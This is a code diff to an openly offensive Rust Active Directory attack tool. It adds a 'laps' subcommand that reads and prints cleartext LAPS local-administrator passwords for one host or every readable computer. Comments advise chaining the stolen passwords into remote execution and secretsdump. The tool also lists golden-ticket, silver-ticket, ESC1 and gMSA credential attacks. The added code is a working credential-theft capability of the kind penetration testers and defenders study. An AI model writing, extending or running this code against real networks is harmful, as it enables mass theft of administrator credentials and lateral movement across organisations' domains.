@@ -101,6 +101,8 @@ enum AttackCmd {
     Secretsdump(SecretsdumpArgs),
     /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
     Gmsa(GmsaArgs),
+    /// Read LAPS local-admin passwords (ms-Mcs-AdmPwd / msLAPS-Password) over LDAPS.
+    Laps(LapsArgs),
     /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
     Esc1(Esc1Args),
     /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
@@ -262,6 +264,22 @@ struct GmsaArgs {
     /// gMSA sAMAccountName (e.g. gmsa_web$)
     #[arg(long)]
     target: String,
+}
+
+#[derive(Parser)]
+struct LapsArgs {
+    /// LDAP URL (LDAPS required — the password is only returned over a sealed channel)
+    #[arg(long)]
+    url: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    #[arg(long)]
+    insecure: bool,
+    /// Computer sAMAccountName to read (e.g. WIN11$). Omit to dump every LAPS password you can read.
+    #[arg(long)]
+    target: Option<String>,
 }
 
 #[derive(Parser)]
@@ -574,6 +592,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Atexec(a)) => atexec_cmd(a).await,
         Command::Attack(AttackCmd::Secretsdump(a)) => secretsdump(a).await,
         Command::Attack(AttackCmd::Gmsa(a)) => gmsa(a).await,
+        Command::Attack(AttackCmd::Laps(a)) => laps(a).await,
         Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
         Command::Attack(AttackCmd::Golden(a)) => golden(a).await,
         Command::Attack(AttackCmd::Silver(a)) => silver(a).await,
@@ -1215,6 +1234,49 @@ async fn gmsa(a: GmsaArgs) -> Result<()> {
         a.target,
         blob.len()
     );
+    Ok(())
+}
+
+/// Read LAPS local-administrator passwords over LDAPS — one host (`--target WIN11$`) or every
+/// computer whose LAPS attribute the bind identity can read. Ubiquitous instant-local-admin;
+/// chain the cleartext into `attack exec`/`secretsdump` as the local Administrator.
+async fn laps(a: LapsArgs) -> Result<()> {
+    use adhammer_collector::{Collector, LdapConfig};
+    let cfg = LdapConfig {
+        url: a.url.clone(),
+        bind_dn: a.user.clone(),
+        password: a.password.clone(),
+        base_dn: None,
+        insecure: a.insecure,
+        gssapi: false,
+    };
+    let mut c = Collector::connect(&cfg).await?;
+    let entries = c.read_laps(a.target.as_deref()).await?;
+    if entries.is_empty() {
+        anyhow::bail!(
+            "no LAPS password readable (no LAPS deployed, or the bind identity lacks the read right — try a specific --target <HOST$>)"
+        );
+    }
+    let mut cleartext = 0usize;
+    for e in &entries {
+        match &e.password {
+            Some(pw) => {
+                cleartext += 1;
+                let exp = e
+                    .expires
+                    .as_deref()
+                    .map(|x| format!("  expires={x}"))
+                    .unwrap_or_default();
+                // TAB-separated: HOST$  account  password  [expires]
+                println!("{}\t{}\t{}{}", e.sam, e.account, pw, exp);
+            }
+            None => eprintln!(
+                "[!] {} exposes {} (DPAPI-NG encrypted) — cleartext decryption not yet supported",
+                e.sam, e.source
+            ),
+        }
+    }
+    eprintln!("[+] LAPS: {cleartext} cleartext local-admin password(s) recovered");
     Ok(())
 }
 
